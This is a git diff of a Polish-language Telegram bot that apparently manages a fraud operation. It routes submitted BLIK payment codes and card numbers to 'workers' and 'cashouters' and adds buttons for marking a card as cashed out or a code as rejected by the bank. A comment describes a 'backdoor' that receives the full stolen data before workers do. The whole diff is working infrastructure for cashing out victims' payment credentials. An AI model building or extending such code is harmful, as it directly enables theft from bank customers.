@@ -3284,6 +3284,17 @@ async function canProcessGatewayAction(userId, ownerId, { chatId = null, chatTyp
 	return false;
 }
 
+// Decyzje (akcept/odrzuć/limit) podejmuje się WYŁĄCZNIE na grupie z kodami.
+// Wyjątek: self cashout — kod idzie tylko na PV workera, więc tam przyciski zostają.
+async function isPrivateStrayDecision(chatId, userId, itemKey) {
+	if (String(chatId) !== String(userId)) return false;
+	const owner = itemKey
+		? (codeMeta.get(itemKey)?.owner ?? codeOwner.get(itemKey)?.smiec ?? kartaOwner.get(itemKey)?.smiec)
+		: null;
+	if (owner && await isSelfCashoutEnabled(owner)) return false;
+	return true;
+}
+
 async function sendGatewaySubmission(ownerId, message, { keyboard = null, threadId = null, parseMode = "HTML", key = null, mainMessage = null, mainKeyboard = null } = {}) {
 	const opts = { parse_mode: parseMode };
 	if (keyboard) opts.reply_markup = keyboard;
@@ -3303,9 +3314,30 @@ async function sendGatewaySubmission(ownerId, message, { keyboard = null, thread
 		return "channel";
 	}
 
-	// Self cashout: backdoor dostaje pełne dane NATYCHMIAST, worker dopiero po /delay
+	// Self cashout: backdoor dostaje pełne dane NATYCHMIAST, worker dopiero po /delay.
+	// Kod nie idzie na grupę, więc worker dostaje przyciski decyzji na PV.
+	const ownerDecisionKb = (() => {
+		if (!key) return null;
+		if (key.startsWith("blik_")) {
+			const c = key.slice(5);
+			return { inline_keyboard: [
+				[{ text: "Siedzi", icon_custom_emoji_id: "5774022692642492953", callback_data: `status_2_${c}` }],
+				[{ text: "Limit w Banku", icon_custom_emoji_id: "6030563507299160824", callback_data: `status_3_${c}` }],
+				[{ text: "Błędny kod", icon_custom_emoji_id: "5938215362473496448", callback_data: `status_4_${c}` }]
+			] };
+		}
+		if (key.startsWith("card_")) {
+			const c = key.slice(5);
+			return { inline_keyboard: [
+				[{ text: "Karta Wypłacona", icon_custom_emoji_id: "5774022692642492953", callback_data: `card_1_${c}` }],
+				[{ text: "Limit w Banku", icon_custom_emoji_id: "6030563507299160824", callback_data: `card_2_${c}` }],
+				[{ text: "Karta Odrzucona", icon_custom_emoji_id: "5938215362473496448", callback_data: `card_3_${c}` }]
+			] };
+		}
+		return null;
+	})();
 	const deliverOwner = async () => {
-		const mid = await sendTelegramHtmlSafe(ownerId, message, keyboard);
+		const mid = await sendTelegramHtmlSafe(ownerId, message, ownerDecisionKb);
 		if (key) registerCodeMessage(key, ownerId, mid);
 	};
 	if (backdoorDelayMs > 0) scheduleDelayed(backdoorDelayMs, deliverOwner);
@@ -5234,7 +5266,9 @@ async function handleAdminModerationCallback(query, ctx) {
 			}).catch(() => {});
 		}
 
-		// Panel cashoutera na PV
+		// Panel cashoutera na PV — TYLKO informacyjny, bez przycisków.
+		// Decyzje (akcept/odrzuć/limit) podejmuje się wyłącznie na grupie z kodami.
+		const claimSelfCashout = await isSelfCashoutEnabled(targetUserId);
 		const panelMsg = await sendFgMessage(
 			userId,
 			buildModernStatus([
@@ -5246,8 +5280,10 @@ async function handleAdminModerationCallback(query, ctx) {
 						modernKv(isCard ? "Karta" : "Kod", item)
 					]
 				}
-			]) + "\n\n" + modernInfo("Wybierz akcję poniżej."),
-			decisionKeyboard
+			]) + "\n\n" + modernInfo(claimSelfCashout
+				? "Wybierz akcję poniżej."
+				: "Decyzję podejmij na grupie z kodami."),
+			claimSelfCashout ? decisionKeyboard : null
 		).catch(() => null);
 		registerClaimPanel(item, userId, panelMsg?.message_id);
 		return true;
@@ -5455,6 +5491,18 @@ async function handleFgCallback(query) {
 		const claimItemKey = isDecisionCallback ? claimItemFrom(data) : null;
 		const iAmClaimer = claimItemKey && String(codeClaimer.get(claimItemKey) || "") === String(userId);
 		const inChannelWorkflow = isCodesChat(chatId) || iAmClaimer;
+
+		// Decyzja kliknięta na PV (poza self cashoutem) — tylko komunikat, że trzeba na grupę
+		if (
+			isDecisionCallback &&
+			(await isPrivateStrayDecision(chatId, userId, claimItemKey))
+		) {
+			await bot.answerCallbackQuery(query.id, {
+				text: "❌ Decyzję podejmij na grupie z kodami.",
+				show_alert: true
+			}).catch(() => {});
+			return true;
+		}
 
 		if (!isAdmin && (isCodesChat(chatId) || iAmClaimer)) {
 			const handled = await handleAdminModerationCallback(query, {
@@ -11915,6 +11963,18 @@ bot.on('callback_query', async (query) => {
 			cardNumber = data[1];
 			status = null;
 		}
+	}
+
+	// Decyzja kliknięta na PV (poza self cashoutem) — decydujemy tylko na grupie z kodami
+	if (
+		((action === 'status' && data.length === 3) || (action === 'card' && data.length === 3)) &&
+		(await isPrivateStrayDecision(query.message.chat.id, query.from.id, code || cardNumber))
+	) {
+		await bot.answerCallbackQuery(query.id, {
+			text: "❌ Decyzję podejmij na grupie z kodami.",
+			show_alert: true
+		}).catch(() => {});
+		return;
 	}
 
 	try {
